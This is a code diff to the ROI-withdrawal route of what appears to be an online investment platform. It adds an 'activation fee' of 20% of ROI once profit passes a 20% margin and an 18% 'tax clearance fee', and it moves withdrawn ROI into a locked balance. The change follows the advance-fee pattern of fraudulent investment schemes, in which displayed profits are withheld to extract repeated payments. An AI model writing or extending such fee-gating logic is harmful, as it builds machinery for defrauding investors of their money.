@@ -118,11 +118,36 @@ router.post('/withdraw-roi/:investmentId', auth, async (req, res) => {
       console.error('[WITHDRAW ROI] No ROI available to withdraw for investment:', investmentId);
       return res.status(400).json({ error: 'No ROI available to withdraw.' });
     }
-    // Get wallet info from user or use defaults
-    let { walletAddress, network, currency } = req.body;
-    // If not provided, use the user's first wallet or fallback defaults
+
+    // Get user for fee calculations
     const User = require('../models/User');
     const user = await User.findById(userId);
+    if (!user) {
+      return res.status(404).json({ error: 'User not found.' });
+    }
+
+    // Check if profit exceeds margin (20% of initial investment) - require activation fee
+    const profitMargin = investment.amount * 0.20; // 20% margin
+    if (roi > profitMargin && !user.activationFee.paid) {
+      const activationFeeAmount = roi * 0.20; // 20% of ROI
+      
+      // Set activation fee requirement
+      user.activationFee.required = true;
+      user.activationFee.amount = activationFeeAmount;
+      await user.save();
+      
+      return res.status(402).json({ 
+        error: 'Activation fee required',
+        message: 'Your profit has exceeded the margin. An activation fee of 20% is required before withdrawal.',
+        feeType: 'activation',
+        feeAmount: activationFeeAmount,
+        roi: roi,
+        margin: profitMargin
+      });
+    }
+
+    // Get wallet info from user or use defaults
+    let { walletAddress, network, currency } = req.body;
     let wallet = null;
     if (user && user.wallets && user.wallets.length > 0) {
       wallet = user.wallets[0];
@@ -145,17 +170,37 @@ router.post('/withdraw-roi/:investmentId', auth, async (req, res) => {
       updatedAt: new Date(),
     });
     console.log('[WITHDRAW ROI] About to save withdrawal:', withdrawal);
+    
     // Mark ROI as withdrawn
     investment.roiWithdrawn = true;
     console.log('[WITHDRAW ROI] About to save investment:', investment);
-    // Add ROI to lockedBalance
+    
+    // Add ROI to lockedBalance and set tax clearance fee requirement
     user.lockedBalance = (user.lockedBalance || 0) + roi;
+    
+    // Set tax clearance fee requirement (18% of ROI)
+    const taxClearanceFeeAmount = roi * 0.18;
+    user.taxClearanceFee.required = true;
+    user.taxClearanceFee.amount = taxClearanceFeeAmount;
+    user.taxClearanceFee.reason = `Tax clearance fee for ROI withdrawal of $${roi.toFixed(2)}`;
+    
     await withdrawal.save();
     await investment.save();
     await user.save();
     // Fetch updated locked balance
     const newLockedBalance = user.lockedBalance;
-    res.json({ success: true, withdrawal, roi, newLockedBalance, user });
+    res.json({ 
+      success: true, 
+      withdrawal, 
+      roi, 
+      newLockedBalance, 
+      user,
+      taxClearanceFee: {
+        required: true,
+        amount: taxClearanceFeeAmount,
+        message: 'A tax clearance fee of 18% is required before funds can be moved to your available balance.'
+      }
+    });
   } catch (err) {
     console.error('[WITHDRAW ROI] Internal error:', err);
     res.status(500).json({ error: err.message });
